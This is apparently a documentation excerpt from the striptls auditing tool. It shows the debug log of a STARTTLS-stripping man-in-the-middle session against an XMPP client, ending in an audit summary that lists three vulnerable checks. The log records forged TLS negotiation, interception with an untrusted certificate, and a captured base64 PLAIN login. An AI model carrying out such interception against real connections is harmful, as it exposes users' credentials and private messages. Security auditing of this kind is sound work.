        2016-02-05 16:53:42,799 - INFO     - <Session 0x7f083196a8d0> client ('192.168.139.1', 56892) has connected
        2016-02-05 16:53:42,799 - INFO     - <Session 0x7f083196a8d0> connecting to target ('jabber.ccc.de', 5222)
        2016-02-05 16:53:42,901 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        2016-02-05 16:53:42,903 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.UntrustedIntercept new: True>
        2016-02-05 16:53:42,980 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='10051743579572304948' from='jabber.ccc.de' version='1.0' xml:lang='en'><stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
        2016-02-05 16:53:42,984 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        2016-02-05 16:53:42,986 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server][mangled] "<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        2016-02-05 16:53:43,006 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server][mangled] waiting for inbound SSL Handshake
        2016-02-05 16:53:43,008 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        2016-02-05 16:53:43,060 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server][mangled] performing outbound SSL handshake
        2016-02-05 16:53:43,219 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server][mangled] None
        2016-02-05 16:53:43,221 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
        2016-02-05 16:53:43,225 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        2016-02-05 16:53:43,369 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='6938642107398534259' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
        2016-02-05 16:53:43,379 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><register xmlns='http://jabber.org/features/iq-register'/><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><mechanism>PLAIN</mechanism><mechanism>X-OAUTH2</mechanism><mechanism>SCRAM-SHA-1</mechanism></mechanisms></stream:features>"
        2016-02-05 16:53:43,423 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
        2016-02-05 16:53:43,426 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN' xmlns:ga='http://www.google.com/talk/protocol/auth' ga:client-uses-full-bind-result='true'>AHRpbgB4eA==</auth>"
        2016-02-05 16:53:43,581 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<failure xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><not-authorized/></failure>"
        2016-02-05 16:53:43,611 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
        2016-02-05 16:53:43,616 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '/stream:stream>'
        2016-02-05 16:53:43,620 - WARNING  - <Session 0x7f083196a8d0> terminated.

XMPP Audit results
^^^^^^^^^^^^^^^^^^

::

        2016-02-05 16:53:46,352 - WARNING  - Ctrl C - Stopping server
        2016-02-05 16:53:46,353 - INFO     -  -- audit results --
        2016-02-05 16:53:46,353 - INFO     - [*] client: 192.168.139.1
        2016-02-05 16:53:46,353 - INFO     -     [Vulnerable!] <class striptls.StripInboundTLS at 0x7f08319a6808>
        2016-02-05 16:53:46,353 - INFO     -     [Vulnerable!] <class striptls.StripFromCapabilities at 0x7f08319a67a0>
        2016-02-05 16:53:46,353 - INFO     -     [Vulnerable!] <class striptls.UntrustedIntercept at 0x7f08319a6870>

